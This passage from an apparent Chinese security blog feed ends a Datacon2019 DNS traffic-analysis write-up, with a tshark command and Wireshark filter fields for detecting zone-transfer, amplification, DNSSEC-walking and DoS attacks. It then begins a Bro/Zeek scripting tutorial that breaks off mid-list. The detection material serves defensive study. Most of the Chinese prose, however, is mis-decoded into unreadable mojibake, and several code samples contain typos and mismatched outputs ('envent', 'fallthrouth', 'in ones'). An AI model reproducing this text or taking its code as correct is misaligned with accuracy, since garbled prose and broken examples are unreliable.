<p><code>tshark -r q1_final.pcap -Y 'dns and dns.flags.response == 0 and ip.src == 144.202.64.226' -T fields -e frame.number -e ip.dst -e dns.qry.name | awk '&#123;domain[$3] += 1&#125; END &#123;for(i in domain) if(domain[i] != 2) print i, domain[i]&#125;' &gt; query_one_time_domain.csv</code></p>
<p>æˆ‘ä»¬å‘ç°ï¼šè¿™äº›åŸŸåè¦ä¹ˆæ˜¯Google çš„8.8.8.8ï¼Œè®¿é—®äº†å››æ¬¡ï¼Œç”¨äºè¯•æ¢å››ä¸ªâ€œè·³æ¿â€DNS é€’å½’æœåŠ¡å™¨æ˜¯å¦å·¥ä½œï¼›è¦ä¹ˆæ˜¯æ²¡æœ‰æ”¶åˆ°å“åº”çš„è¯·æ±‚ï¼Œå› æ­¤åªè®¿é—®äº†ä¸€æ¬¡ã€‚è¿™é—´æ¥çš„è¯´æ˜äº†å—å®³è€…çš„èµ„æºå·²ç»è¢«æ¶ˆè€—äº†éå¸¸å¤šï¼Œ<a href="http://xn--b0e-xi9dxh38pw5uwor.com.cn">æ”»å‡»äººå¯¹äºb0e.com.cn</a> æƒå¨æœåŠ¡å™¨çš„DoS æ”»å‡»æ˜¯æˆåŠŸçš„ã€‚</p>
<hr>
<h2 id="0x06-åˆ†ææ€è·¯æ€»ç»“">0x06 åˆ†ææ€è·¯æ€»ç»“</h2>
<ul>
<li>é¦–å…ˆæŸ¥çœ‹Opcodeä¸ä¸º0ï¼Œå³éStandard Queryçš„æŸ¥è¯¢æ•°æ®åŒ…
<ul>
<li>ç‰¹å¾å­—æ®µï¼š<code>dns.flags.opcode</code>
<ul>
<li><code>dns.flags.opcode != 0(Standard query)</code>
<ul>
<li><code>dns.flags.opcode == 5(Dynamic Update) </code>â€”&gt; æœªæˆæƒçš„DNS Dynamic Update</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>å†æŸ¥çœ‹ç±»å‹ä¸ä¸ºA(1)å’ŒAAAA(28)ï¼Œå³IPV4å’ŒIPV6çš„æŸ¥è¯¢æ•°æ®åŒ…
<ul>
<li>ç‰¹å¾å­—æ®µï¼š<code>dns.qry.type</code>
<ul>
<li><code>dns.qry.type != 1(A) and 28(AAAA)</code>
<ul>
<li>``dns.qry.type == 255(* ALL)` â€”&gt; åå°„æ”¾å¤§æ”»å‡»</li>
<li><code>dns.qry.type == 252(AXFR)</code> â€”&gt; æœªæˆæƒçš„DNSåŸŸä¼ è¾“æ”»å‡»</li>
<li><code>dns.qry.type == 43(DS) and 6(SOA)</code> â€”&gt; DNSSec åŸŸåéå†æ”»å‡»</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>æœ€åå¯ä»¥ç»Ÿè®¡ä¸€ä¸‹è¿”å›No Such Nameçš„å“åº”æ•°æ®åŒ…
<ul>
<li>ç‰¹å¾å­—æ®µï¼š<code>dns.flags.rcode</code>
<ul>
<li><code>dns.flags.rcode != 0(No Error)</code>
<ul>
<li><code>dns.flags.rcode == 3(No such name)</code> â€”&gt; DoSæ”»å‡»</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>æµé‡åˆ†æ</category>
        <category>æ¯”èµ›é¢˜</category>
      </categories>
      <tags>
        <tag>Wireshark</tag>
        <tag>æµé‡åˆ†æ</tag>
        <tag>DNS</tag>
        <tag>Datacon2019</tag>
      </tags>
  </entry>
  <entry>
    <title>Broè¯­æ³•å­¦ä¹ ä¹‹åŸºç¡€çŸ¥è¯†</title>
    <url>/Web_security/traffic_analysis/3.Bro%E8%AF%AD%E6%B3%95%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/</url>
    <content><![CDATA[<h1 id="Broè¯­æ³•å­¦ä¹ ä¹‹åŸºç¡€çŸ¥è¯†">Broè¯­æ³•å­¦ä¹ ä¹‹åŸºç¡€çŸ¥è¯†</h1>
<p>æœ€è¿‘ä¸€ä¸ªé¡¹ç›®ä½¿ç”¨åˆ°äº†Broå’ŒArgusè¿™ä¸¤ä¸ªå¼€æºçš„æµé‡åˆ†æå·¥å…·ï¼Œå‰è€…ç°åœ¨æ”¹åä¸ºZeekï¼Œåè€…åœ¨2015å¹´åœæ­¢äº†ç»´æŠ¤ã€‚å€Ÿæ­¤æœºä¼šç®€å•çš„ä»‹ç»ä¸€ä¸‹Broè„šæœ¬çš„åŸºæœ¬è¯­æ³•ï¼Œåé¢æœ‰æ—¶é—´çš„è¯ä¼šå†å†™ä¸€æœ¬å…³äºé€šè¿‡ç¼–å†™è„šæœ¬è‡ªå®šä¹‰æ—¥å¿—æ–‡ä»¶çš„æ–‡ç« ã€‚</p>
<blockquote>
<p><a href="http://try.zeek.org/">http://try.zeek.org/</a></p>
</blockquote>
<h2 id="Hello-World">Hello World</h2>
<p>Zeekæ˜¯åŸºäºäº‹ä»¶ï¼ˆeventï¼‰é©±åŠ¨çš„ï¼Œä¹Ÿå°±è¯´ï¼Œä½ å¯ä»¥é€šè¿‡äº‹ä»¶è§¦å‘æ¥æ§åˆ¶ä»»ä½•è¦æ‰§è¡Œçš„åŠ¨ä½œã€‚è¿™é‡Œä»¥<code>bro_init()</code>å’Œ<code>bro_done()</code>è¿™ä¸¤ä¸ªäº‹ä»¶ä¸¾ä¾‹ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">event bro_init()</span><br><span class="line">	&#123;</span><br><span class="line">	print &quot;Hello, World&quot;;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">event bro_done()</span><br><span class="line">	&#123;</span><br><span class="line">	print &quot;Goodbye, World&quot;;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<p><code>bro_init()</code>å’Œ<code>bro_done()</code>éƒ½æ˜¯åŸºæœ¬äº‹ä»¶ï¼Œå½“Zeekå¼€å§‹è¿è¡Œæ—¶ä¼šæ‰§è¡Œ<code>bro_init()</code>äº‹ä»¶ï¼Œå½“Zeekåœæ­¢è¿è¡Œæ—¶ä¼šæ‰§è¡Œ<code>bro_done()</code>äº‹ä»¶ã€‚</p>
<p><a href="https://docs.zeek.org/en/stable/script-reference/log-files.html">è¿™é‡Œ</a>è¿˜æœ‰æ›´å¤šçš„ZeekåŸºæœ¬äº‹ä»¶ã€‚</p>
<h2 id="åŠ è½½è„šæœ¬">åŠ è½½è„šæœ¬</h2>
<p>åƒå…¶ä»–çš„ç¼–ç¨‹è¯­è¨€ä¸€æ ·ï¼ŒZeekä¹Ÿå¯ä»¥é€šè¿‡<code>@load</code>å…³é”®å­—æ¥åŠ è½½å…¶ä»–è„šæœ¬ä¸­çš„ä»£ç ã€‚å³ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@load misc&#x2F;dump-events</span><br></pre></td></tr></table></figure>
<p><code>misc/dump-events</code>è¿™ä¸ªè„šæœ¬å°†Zeekäº§ç”Ÿçš„äº‹ä»¶ä»¥å¯è¯»çš„å½¢å¼å±•ç°å‡ºæ¥ï¼Œé€šå¸¸ç”¨äºè°ƒè¯•ä»¥åŠç†è§£äº‹ä»¶åŠå…¶å‚æ•°ã€‚éƒ¨åˆ†è¾“å‡ºå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p>
<p><img src="https://i.loli.net/2019/09/23/gM1EVGi7Lj8oB5x.png" alt=""></p>
<h2 id="å‡½æ•°">å‡½æ•°</h2>
<p>é¦–å…ˆæ¥çœ‹ä¸€ä¸ªç¤ºä¾‹ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># Function implementation</span><br><span class="line">function emphasize(s: string, p: string &amp;default &#x3D; &#39;*&#39;): string</span><br><span class="line">	&#123;</span><br><span class="line">	return p + s + p;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">envent bro_init()</span><br><span class="line">	&#123;</span><br><span class="line">	# Function calls</span><br><span class="line">	print emphasize(&quot;yes&quot;);</span><br><span class="line">	print emphasize(&quot;no&quot;, &quot;_&quot;);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<p>è¾“å‡ºï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">*yes*</span><br><span class="line">_no_</span><br></pre></td></tr></table></figure>
<p>æœ‰å…¶ä»–ç¼–ç¨‹ç»éªŒçš„åŒå­¦çœ‹è¿™ä¸ªä¾‹å­åº”è¯¥æ¯”è¾ƒå¥½ç†è§£ã€‚è¿™é‡Œç®€å•è¯´ä¸€ä¸‹<code>emphasize()</code>å‡½æ•°ï¼Œå®ƒæ¥æ”¶ä¸¤ä¸ª<code>String</code>ç±»å‹çš„å‚æ•°ï¼Œå…¶ä¸­ç¬¬äºŒä¸ªå‚æ•°æœ‰ä¸€ä¸ªé»˜è®¤å€¼<code>*</code>ï¼ˆç”¨<code>&amp;default</code>å…³é”®å­—ä¿®é¥°ï¼‰ï¼Œå³å¯é€‰å‚æ•°ï¼Œå¹¶è§„å®šäº†è¿”å›å€¼ç±»å‹æ˜¯<code>String</code>ã€‚</p>
<p>å¦å¤–ä¸€ç‚¹ï¼ŒZeekå¯ä»¥ç›´æ¥ä½¿ç”¨<code>+</code>æ¥æ‹¼æ¥å­—ç¬¦ä¸²ã€‚</p>
<p>Another side note on the relation between functions and events: Events are a kind of function as well, and both can only be declared at the global level; one cannot nest them.</p>
<h2 id="å˜é‡">å˜é‡</h2>
<p>å…³äºå˜é‡çš„ä½œç”¨åŸŸï¼ŒZeekæä¾›äº†ä¸¤ç§å…³é”®å­—æ¥ä¿®é¥°å˜é‡ï¼š<code>local</code>å’Œ<code>global</code>ã€‚å…·ä½“ç¤ºä¾‹å¦‚ä¸‹ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">global x &#x3D; &#39;Hello&#39;;</span><br><span class="line"></span><br><span class="line">event bro_init()</span><br><span class="line">	&#123;</span><br><span class="line">	print x;</span><br><span class="line">	</span><br><span class="line">	const y &#x3D; &quot;Guten Tag&quot;;</span><br><span class="line">	# Changing value of &#39;y&#39; is not allowed.</span><br><span class="line">	#y &#x3D; &quot;Nope&quot;;</span><br><span class="line">	</span><br><span class="line">	local z &#x3D; &quot;What does that mean?&quot;;</span><br><span class="line">	print z;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">event bro_done()</span><br><span class="line">	&#123;</span><br><span class="line">	x &#x3D; &quot;Bye&quot;;</span><br><span class="line">	print x;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<p>è¾“å‡ºï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Hello</span><br><span class="line">What does that mean?</span><br><span class="line">Bye</span><br></pre></td></tr></table></figure>
<p>å¯ä»¥çœ‹åˆ°ï¼Œç”¨<code>local</code>ä¿®é¥°çš„å˜é‡çš„ä½œç”¨åŸŸä¸¥æ ¼é™åˆ¶åœ¨å‡½æ•°ä½“å†…ï¼Œ<code>global</code>ç±»ä¼¼äºå…¨å±€å˜é‡çš„æ•ˆæœï¼Œå¦‚æœåœ¨å‡½æ•°å†…éƒ¨å®šä¹‰äº†ä¸€ä¸ªä¸å…¨å±€å˜é‡ç›¸åŒçš„å±€éƒ¨å˜é‡ï¼Œé‚£ä¹ˆå±€éƒ¨å˜é‡ä¼šè¦†ç›–å…¨å±€å˜é‡ã€‚</p>
<p>å¦å¤–ï¼Œç”¨<code>const</code>ä¿®é¥°çš„å˜é‡ç›¸å½“äºå¸¸æ•°ï¼Œæ˜¯ä¸å¯æ›´æ”¹çš„ã€‚</p>
<h2 id="åŸå§‹æ•°æ®ç±»å‹">åŸå§‹æ•°æ®ç±»å‹</h2>
<p>å¯¹äºå˜é‡çš„æ•°æ®ç±»å‹ï¼ŒZeekå’ŒCã€Javaç­‰è¯­è¨€ç›¸ä¼¼ï¼Œå³ä¸€ä¸ªå˜é‡ä¿å­˜çš„æ•°æ®ç±»å‹æ˜¯å›ºå®šçš„ï¼Œå¹¶ä¸”å®ƒå¯ä»¥ä»ä½ çš„èµ‹å€¼æ¥æ¨æ–­è¯¥å˜é‡çš„æ•°æ®ç±»å‹ï¼Œä¸ç”¨æ˜¾ç¤ºåœ°å£°æ˜ï¼Œä¹Ÿå°±è¯´<code>local x = 0</code>å’Œ<code>local x: count = 0</code>æ˜¯ç­‰ä»·çš„ã€‚</p>
<p><a href="https://docs.zeek.org/en/stable/script-reference/types.html#type-count">è¿™é‡Œ</a>åˆ—ä¸¾äº†Zeekæ”¯æŒçš„æ‰€æœ‰æ•°æ®ç±»å‹ã€‚</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">event bro_init()</span><br><span class="line">	&#123;</span><br><span class="line">	local x: string &#x3D; &quot;two&quot;;</span><br><span class="line">	local y: int &#x3D; 10000000000000000000000000000000000000000000000000;</span><br><span class="line">	print &quot;y is a large int:&quot;, y;</span><br><span class="line">	print &quot;x is a short string:&quot;, x;</span><br><span class="line">	</span><br><span class="line">	#pattern matching</span><br><span class="line">	print &#x2F;one|two|three&#x2F; &#x3D;&#x3D; &quot;two&quot;;</span><br><span class="line">	print &#x2F;one|two|three&#x2F; &#x3D;&#x3D; &quot;ones&quot;;</span><br><span class="line">	print &#x2F;one|two|three&#x2F; in ones;</span><br><span class="line">	print &#x2F;[123].*&#x2F; &#x3D;&#x3D; &quot;2 two&quot;;</span><br><span class="line">	print &#x2F;[123].*&#x2F; &#x3D;&#x3D; &quot;4 four&quot;;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<p>è¾“å‡ºï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">y is a large int:, -1</span><br><span class="line">x is a short string:, two</span><br><span class="line">T</span><br><span class="line">F</span><br><span class="line">T</span><br><span class="line">T</span><br><span class="line">F</span><br></pre></td></tr></table></figure>
<p>ä¸Šé¢ä¾‹å­çš„ç¬¬äºŒéƒ¨åˆ†ç»™æˆ‘ä»¬æ¼”ç¤ºäº†ä¸€ç§æ¨¡å¼åŒ¹é…ï¼ˆçœ‹èµ·æ¥æœ‰ç‚¹åƒæ­£åˆ™è¡¨è¾¾å¼ï¼‰ï¼Œä¸¤ä¸ª<code>/</code>ç¬¦å·ä¸­æ˜¯å¾…åŒ¹é…çš„å¼å­ï¼Œä¸åŒå…ƒç´ ç”¨<code>|</code>ç¬¦å·éš”å¼€ã€‚<code>==</code>æ˜¯ç²¾ç¡®åŒ¹é…ï¼Œ<code>in</code>æ˜¯æ¨¡ç³ŠåŒ¹é…ï¼Œ<code>[123].*</code>åŒ¹é…ä»»æ„ä»¥123å…¶ä¸­æŸä¸€ä¸ªæ•°å­—å¼€å¤´çš„å­—ç¬¦ä¸²ã€‚</p>
<h2 id="æ“ä½œç¬¦">æ“ä½œç¬¦</h2>
<h3 id="æ•°å­¦æ“ä½œç¬¦">æ•°å­¦æ“ä½œç¬¦</h3>
<table>
<thead>
<tr>
<th style="text-align:left">Name</th>
<th style="text-align:left">Syntax</th>
<th style="text-align:left">Example Usage</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">åŠ </td>
<td style="text-align:left"><code>a + b</code></td>
<td style="text-align:left"><code>print 2 + 2; # 4</code></td>
</tr>
<tr>
<td style="text-align:left">å‡</td>
<td style="text-align:left"><code>a - b</code></td>
<td style="text-align:left"><code>print 2 - 2; # 0</code></td>
</tr>
<tr>
<td style="text-align:left">ä¹˜</td>
<td style="text-align:left"><code>a * b</code></td>
<td style="text-align:left"><code>print 4 * 4; # 16</code></td>
</tr>
<tr>
<td style="text-align:left">é™¤</td>
<td style="text-align:left"><code>a / b</code></td>
<td style="text-align:left"><code>print 15 / 3; # 5</code></td>
</tr>
<tr>
<td style="text-align:left">å–ä½™</td>
<td style="text-align:left"><code>a % b</code></td>
<td style="text-align:left"><code>print 18 % 15; # 3</code></td>
</tr>
<tr>
<td style="text-align:left">ä¸€å…ƒåŠ å·</td>
<td style="text-align:left"><code>+a</code></td>
<td style="text-align:left"><code>local a = +1; # Force use of a signed integer</code></td>
</tr>
<tr>
<td style="text-align:left">ä¸€å…ƒå‡å·</td>
<td style="text-align:left"><code>-a</code></td>
<td style="text-align:left"><code>local a = 5; print -a; # -5</code></td>
</tr>
<tr>
<td style="text-align:left">è‡ªå¢</td>
<td style="text-align:left"><code>++a</code></td>
<td style="text-align:left"><code>local a = 1; print ++a, a; # 2, 2</code></td>
</tr>
<tr>
<td style="text-align:left">è‡ªå‡</td>
<td style="text-align:left"><code>--a</code></td>
<td style="text-align:left"><code>local a = 2; print --a, a; # 1, 1</code></td>
</tr>
</tbody>
</table>
<h3 id="èµ‹å€¼æ“ä½œç¬¦">èµ‹å€¼æ“ä½œç¬¦</h3>
<table>
<thead>
<tr>
<th>Name</th>
<th>Synatx</th>
<th>Example Usage</th>
</tr>
</thead>
<tbody>
<tr>
<td>=èµ‹å€¼</td>
<td><code>a=b</code></td>
<td><code>local a = 7;</code></td>
</tr>
<tr>
<td>+èµ‹å€¼</td>
<td><code>a += b</code></td>
<td><code>local a = 7; a += 2; # 9</code></td>
</tr>
<tr>
<td>-èµ‹å€¼</td>
<td><code>a -= b</code></td>
<td><code>local a = 7; a -= 2; # 5</code></td>
</tr>
</tbody>
</table>
<h3 id="å…³ç³»æ“ä½œç¬¦">å…³ç³»æ“ä½œç¬¦</h3>
<table>
<thead>
<tr>
<th style="text-align:left">Name</th>
<th style="text-align:left">Syntax</th>
<th style="text-align:left">Example Usage</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">Equality</td>
<td style="text-align:left"><code>a == b</code></td>
<td style="text-align:left"><code>print 2 == 2; # T</code></td>
</tr>
<tr>
<td style="text-align:left">ä¸ç­‰</td>
<td style="text-align:left"><code>a != b</code></td>
<td style="text-align:left"><code>print 2 != 2; # F</code></td>
</tr>
<tr>
<td style="text-align:left">å°äº</td>
<td style="text-align:left"><code>a &lt; b</code></td>
<td style="text-align:left"><code>print 2 &lt; 3; # T</code></td>
</tr>
<tr>
<td style="text-align:left">å°äºç­‰äº</td>
<td style="text-align:left"><code>a &lt;= b</code></td>
<td style="text-align:left"><code>print 2 &lt;= 2; # T</code></td>
</tr>
<tr>
<td style="text-align:left">å¤§äº</td>
<td style="text-align:left"><code>a &gt; b</code></td>
<td style="text-align:left"><code>print 2 &gt; 3; # F</code></td>
</tr>
<tr>
<td style="text-align:left">å¤§äºç­‰äº</td>
<td style="text-align:left"><code>a &gt;= b</code></td>
<td style="text-align:left"><code>print 2 &gt;= 2; # T</code></td>
</tr>
</tbody>
</table>
<h3 id="å…¶ä»–æ“ä½œç¬¦">å…¶ä»–æ“ä½œç¬¦</h3>
<table>
<thead>
<tr>
<th style="text-align:left">Name</th>
<th style="text-align:left">Syntax</th>
<th style="text-align:left">Example Usage</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">å­˜åœ¨äº</td>
<td style="text-align:left"><code>a in b</code></td>
<td style="text-align:left"><code>print &quot;z&quot; in &quot;test&quot;; # F</code></td>
</tr>
<tr>
<td style="text-align:left">ä¸å­˜åœ¨äº</td>
<td style="text-align:left"><code>a !in b</code></td>
<td style="text-align:left"><code>print &quot;z&quot; !in &quot;test&quot;; # T</code></td>
</tr>
<tr>
<td style="text-align:left">å¤§å°/é•¿åº¦</td>
<td style="text-align:left"><code>|a|</code></td>
<td style="text-align:left"><code>print |&quot;test&quot;|; # 4</code></td>
</tr>
<tr>
<td style="text-align:left">ç»å¯¹å€¼</td>
<td style="text-align:left"><code>|a|</code></td>
<td style="text-align:left"><code>print |-5|; # 5</code></td>
</tr>
<tr>
<td style="text-align:left">ç´¢å¼•å–å€¼</td>
<td style="text-align:left"><code>a[i]</code></td>
<td style="text-align:left"><code>print &quot;test&quot;[2]; # s</code></td>
</tr>
<tr>
<td style="text-align:left">åˆ‡ç‰‡</td>
<td style="text-align:left"><code>a[i:j], a[i:], a[:j]</code></td>
<td style="text-align:left"><code>print &quot;testing&quot;[2:4]; # st</code></td>
</tr>
</tbody>
</table>
<h2 id="Ifè¯­å¥">Ifè¯­å¥</h2>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">event bro_init()</span><br><span class="line">	&#123;</span><br><span class="line">	local x &#x3D; &quot;3&quot;;</span><br><span class="line">	</span><br><span class="line">	for (c in &quot;12345&quot;)</span><br><span class="line">		&#123;</span><br><span class="line">		if (c &#x3D;&#x3D; x)</span><br><span class="line">			&#123;</span><br><span class="line">			print &quot;Found it!&quot;;</span><br><span class="line">			print fmt(&quot;And by &#39;it&#39;, I mean %s.&quot;, x);</span><br><span class="line">			&#125;</span><br><span class="line">		else</span><br><span class="line">			&#123;</span><br><span class="line">			print &quot;I&#39;m looking for&quot;, x, &quot;not&quot;, c;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>è¾“å‡ºï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">I&#39;m looking for, 3, not, 1</span><br><span class="line">I&#39;m looking for, 3, not, 2</span><br><span class="line">Found it.</span><br><span class="line">And by &#39;it&#39;, I mean 3.</span><br><span class="line">I&#39;m looking for, 3, not, 4</span><br><span class="line">I&#39;m looking for, 3, not, 5</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>Zeekçš„ifè¯­å¥å’Œå…¶ä»–è¯­è¨€ç±»ä¼¼ï¼Œæœ‰<code>if...else...</code>è¯­å¥å—ï¼Œä¹Ÿæœ‰<code>if...else if...else...</code>è¯­å¥å—ã€‚</p>
<p>è¿™é‡Œç”¨åˆ°äº†<code>fmt()</code>å‡½æ•°ç”¨äºæ ¼å¼åŒ–è¾“å‡ºï¼Œè¯­æ³•ä¸Pythonç±»ä¼¼ã€‚å®ƒä¹Ÿå¯ä»¥ä½¿ç”¨<code>,</code>è¿æ¥å­—ç¬¦ä¸²å’Œå˜é‡ä¹‹é—´ã€‚</p>
<h2 id="foreachè¯­å¥">foreachè¯­å¥</h2>
<p>è§ifè¯­å¥ç« èŠ‚ã€‚</p>
<p>è¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯ï¼Œé™¤äº†<code>vector</code>ç±»å‹å¤–ï¼Œå…¶ä»–çš„æ‰€æœ‰<code>collection</code>ç±»å‹çš„æ•°æ®ç±»å‹éƒ½ä¸èƒ½ä¿è¯å¾ªç¯çš„é¡ºåºã€‚ If the order is important the collection should be a vector.</p>
<h2 id="Whileè¯­å¥">Whileè¯­å¥</h2>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">event bro_init()</span><br><span class="line">	&#123;</span><br><span class="line">	local i &#x3D; 0;</span><br><span class="line">	</span><br><span class="line">	while (i &lt; 5)</span><br><span class="line">	print ++i;</span><br><span class="line">	</span><br><span class="line">	while (i % 2 !&#x3D; 0)</span><br><span class="line">	&#123;</span><br><span class="line">	local finish_up &#x3D; F;</span><br><span class="line">	</span><br><span class="line">	if (finish_up &#x3D;&#x3D; F)</span><br><span class="line">		print &quot;nope&quot;;</span><br><span class="line">		++i;</span><br><span class="line">		next;</span><br><span class="line">		</span><br><span class="line">	if (finish_up)</span><br><span class="line">		break;</span><br><span class="line">	&#125;</span><br><span class="line">	print i;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>è¿™é‡Œçš„<code>break</code>å’Œ<code>next</code>ç±»ä¼¼ä¸å…¶ä»–è¯­è¨€ä¸­çš„<code>break</code>å’Œ<code>continue</code>ã€‚</p>
<p>å¦å¤–ï¼Œä¸Šé¢è¿™æ®µä»£ç æ˜¯å®˜æ–¹ç»™çš„ç¤ºä¾‹ï¼ŒZeekè¯­æ³•çš„ç¼©è¿›åæ­£æˆ‘æœ€å…ˆçœ‹æ˜¯çœ‹çš„æ˜¯ä¸€æ„£ä¸€æ„£çš„ï¼Œåæ¥æ‰å‘ç°Zeekæ˜¯æ—¢æ”¯æŒç¼©è¿›ï¼Œä¹Ÿæ”¯æŒ<code>&#123;&#125;</code>ï¼Œè¿™ä¸¤ç§éƒ½è®¤ã€‚</p>
<h2 id="ç»ƒä¹ ä¸€">ç»ƒä¹ ä¸€</h2>
<ol>
<li>ç¼–å†™ä¸€ä¸ªç¨‹åºï¼Œä»æ‚¨é€‰æ‹©çš„ä»»æ„å­—ç¬¦ä¸²ä¸­åˆ é™¤æ‰€æœ‰çš„å­—æ¯â€œeâ€ï¼ˆå¯ä»¥ä¸å°±åœ°å¤„ç†ï¼‰ã€‚</li>
<li>ç¼–å†™ä¸€ä¸ªç¨‹åºï¼Œæ‰“å°ä»1åˆ°100ï¼Œå¦‚æœæ˜¯3çš„å€æ•°ï¼Œæ‰“å°â€œFizzâ€ï¼›å¦‚æœæ˜¯5çš„å€æ•°ï¼Œæ‰“å°â€œBuzzâ€ã€‚å¦‚æœæ—¢æ˜¯3çš„å€æ•°ä¹Ÿæ˜¯5çš„å€æ•°æ‰“å°<code>FizzBuzz</code>ã€‚</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">event bro_init()</span><br><span class="line">	&#123;</span><br><span class="line">	local result &#x3D; &quot;&quot;;</span><br><span class="line">	</span><br><span class="line">	for (c in &quot;testing&quot;)</span><br><span class="line">		&#123;</span><br><span class="line">		if (c !&#x3D; &quot;e&quot;)</span><br><span class="line">			&#123;</span><br><span class="line">			result +&#x3D; c;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	print result;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"># ä½¿ç”¨é€’å½’</span><br><span class="line">function fizzbuzz(i: count)</span><br><span class="line">	&#123;</span><br><span class="line">	local s &#x3D; &quot;&quot;;</span><br><span class="line">	</span><br><span class="line">	if (i % 3 &#x3D;&#x3D; 0)</span><br><span class="line">		s +&#x3D; &quot;Fizz&quot;;</span><br><span class="line">	if (i % 5 &#x3D;&#x3D; 0)</span><br><span class="line">		s +&#x3D; &quot;Buzz&quot;;</span><br><span class="line">	if (s &#x3D;&#x3D; &quot;&quot;)</span><br><span class="line">		print i;</span><br><span class="line">	else</span><br><span class="line">		print s;</span><br><span class="line">	</span><br><span class="line">	if (i &lt; 100)</span><br><span class="line">		fizzbuzz(i + 1);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">event bro_done()</span><br><span class="line">	&#123;</span><br><span class="line">	fizzbuzz(1);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="Switchè¡¨è¾¾å¼">Switchè¡¨è¾¾å¼</h2>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">event bro_init()</span><br><span class="line">	&#123;</span><br><span class="line">	local x &#x3D; 4;</span><br><span class="line">	</span><br><span class="line">	switch (x)</span><br><span class="line">		&#123;</span><br><span class="line">		case 0:</span><br><span class="line">			print &quot;case 0&quot;;</span><br><span class="line">			break;</span><br><span class="line">		case 1, 2, 3:</span><br><span class="line">			print &quot;case 1, 2, 3&quot;;</span><br><span class="line">			break;</span><br><span class="line">		case 4:</span><br><span class="line">			print &quot;case 4 and ...&quot;;</span><br><span class="line">			fallthrouth;</span><br><span class="line">		case 5:</span><br><span class="line">			# This block may execute if x is 4 or 5.</span><br><span class="line">			print &quot;case 5&quot;;</span><br><span class="line">		default:</span><br><span class="line">			print &quot;default case&quot;;</span><br><span class="line">			break;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><code>fallthrouth</code>å…³é”®å­—ä¼šè®©ç¨‹åºå¿½ç•¥é™åˆ¶æ¡ä»¶è€Œæ¥ç€æ‰§è¡Œä¸‹ä¸€ä¸ªcaseã€‚</p>
<p>ç»ƒä¹ ï¼š</p>
<p>ä½¿ç”¨Switchè¯­å¥ç¼–å†™ä¸€ä¸ªç¨‹åºï¼Œè®¡ç®—ä»»æ„å­—ç¬¦ä¸²ä¸­çš„å…ƒéŸ³ï¼ˆaï¼Œeï¼Œiï¼Œoï¼Œuï¼‰çš„æ•°é‡ã€‚</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">event bro_init()</span><br><span class="line">	&#123;</span><br><span class="line">	local result &#x3D; 0;</span><br><span class="line">	local input &#x3D; &quot;The Zeek Network Security Monitor&quot;;</span><br><span class="line">	for (c in input)</span><br><span class="line">		&#123;</span><br><span class="line">		switch (c)</span><br><span class="line">			&#123;</span><br><span class="line">			case &quot;a&quot;, &quot;e&quot;, &quot;i&quot;, &quot;o&quot;, &quot;u&quot;:</span><br><span class="line">				++result;</span><br><span class="line">				break;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	print result;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="äº‹ä»¶">äº‹ä»¶</h2>
<p>Eventç®—æ˜¯Zeeké‡Œé¢æ¯”è¾ƒæ ¸å¿ƒçš„æ¦‚å¿µï¼Œå¯ä»¥ç®—æ˜¯ä¸€ç§ç‰¹æ®Šå½¢å¼çš„å‡½æ•°ï¼Œä½†ä¸å‡½æ•°åˆä¸åŒçš„æ˜¯ï¼š</p>
<ul>
<li>äº‹ä»¶å¹¶ä¸æƒ³å‡½æ•°ä¸€æ ·ä¼šç«‹åˆ»æ‰§è¡Œï¼Œå®ƒä»¬å¯èƒ½ä¼šåœ¨ä»¥åçš„æ—¶é—´è¿›è¡Œè°ƒåº¦å’Œæ‰§è¡Œï¼Œå› æ­¤å®ƒä»¬çš„æ•ˆæœåœ¨è°ƒç”¨ä¹‹åå¯èƒ½æ— æ³•ç›´æ¥å®ç°ï¼›</li>
